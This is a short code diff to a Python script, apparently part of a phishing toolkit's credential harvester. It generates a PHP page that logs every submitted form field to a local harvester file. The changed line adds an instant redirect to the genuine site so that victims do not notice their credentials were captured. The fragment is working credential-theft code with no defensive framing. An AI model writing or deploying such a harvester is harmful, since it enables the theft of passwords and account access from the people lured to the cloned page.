@@ -436,7 +436,7 @@ def run():
         print "Feel free to customize post.php in the %s directory" % (apache_dir) + bcolors.ENDC
         filewrite = file("%s/post.php" % (apache_dir), "w")
         now=datetime.datetime.today()
-        filewrite.write("""<?php $file = 'harvester_%s.txt';file_put_contents($file, print_r($_POST, true), FILE_APPEND);?>""" % (now))
+        filewrite.write("""<?php $file = 'harvester_%s.txt';file_put_contents($file, print_r($_POST, true), FILE_APPEND);?><meta http-equiv="refresh" content="0; url=%s" />""" % (now, RAW_URL))
         filewrite.close()
         filewrite = file("%s/harvester_%s.txt" % (logpath,now), "w")
         filewrite.write("")
